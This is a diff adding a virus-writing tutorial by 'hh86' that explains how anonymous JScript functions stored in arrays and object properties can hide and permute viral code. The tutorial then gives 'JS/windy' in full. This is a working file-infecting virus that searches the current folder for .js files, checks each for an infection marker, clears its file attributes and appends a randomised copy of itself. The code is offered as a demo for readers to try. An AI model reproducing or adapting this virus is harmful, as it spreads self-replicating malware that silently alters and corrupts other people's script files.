@@ -1,0 +1,95 @@
+                                   Function Me
+                                       by
+                                      hh86
+
+
+
+What is it?
+
+In JScript  we  have  functions.  They are declared like this: "function x(){}",
+the name seems to be important  to identify them, however this is not true, they
+can be nameless.
+
+
+Reflections
+
+When we want to have copy of our code in an infection routine, we  commonly open
+the file where we are running and we read it  entirely.   But we can also assing
+entire code in Function to a variable and call the variable instead, we can also
+assing it in arrays (so we can  push  and  pop functions), this one is specially
+my favourite:
+
+x = [function(){code}, function(){code2}, function(){code3}]
+x[1]()
+//or
+r = "hh"+x[1]()+"86"
+
+
+Awesome!
+They have no  name so there is no very obvious reference to the function we want
+execute, and plus, "x[1]()" is very nice, isn't it?  :)  Using  arrays  seems to
+be specially one great place to permutate the code, move  it around many garbage
+and then execute it without eval.    A nameless function can reference itself in
+Array, by using Array name and index.
+
+There is also the Expando.  We create an Object type variable:
+
+var h = {}
+h.hh86 = "I feel sleepy today"
+
+But we can assing any name we want to the expando, for example we  could use POP
+that is for Arrays (it pops the last item out):
+
+var h = {}
+h.pop = "Looks like POP"
+
+But we know that POP is not complete there.  For a true POP we need "()" for the
+method calling.  So, we can assing a function instead:
+
+var h = {}
+h.pop = function(){WScript.Echo("Hello from POP")}
+h.pop()
+
+This is like using Prototype, but smaller.  ;)
+
+h={};h.pop=function(){...};h.pop()
+
+So that is pretty much  everything  for an explanation of the technique, now you
+have to try it yourself using your imagination. I have written simple code demo,
+it must have no comments and must be single-lined to run  correctly  in infected
+files:
+
+u();
+function u(){
+/*JS/windy by hh86*/
+f = new ActiveXObject("Scripting.FileSystemObject");
+n = ";x" + f.GetTempName().substr(3, 4);
+r = "[" + Math.floor(Math.random()*100) + "]";
+
+                                             //create array to hold virus code
+v = n + "=[]" + n + r + "=" + u + n + r + "()";
+for(y = new Enumerator(f.getfolder(".").files); !y.atEnd(); y.moveNext())
+{
+    x = y.item();
+    if(f.GetExtensionName(x).toLowerCase()=="js")
+    {
+        try
+        {
+            b = f.OpenTextFile(x);
+            h = b.ReadAll();
+            b.Close();
+            if(h.substr(h.length-4, 4) != "hh86")
+            {
+                 p = x.Attributes;
+                 x.Attributes = 0;
+                 l = f.CreateTextFile(x);    //append virus code
+                                             //but it was a trick and the clock struck 12
+                 l.Write(h + "\r\n" + v + "//hh86");
+                 l.Close();
+                 x.Attributes = p
+            }
+        }
+        catch(e){}
+    }
+}
+}                                            //at the end of the tail - just darkness
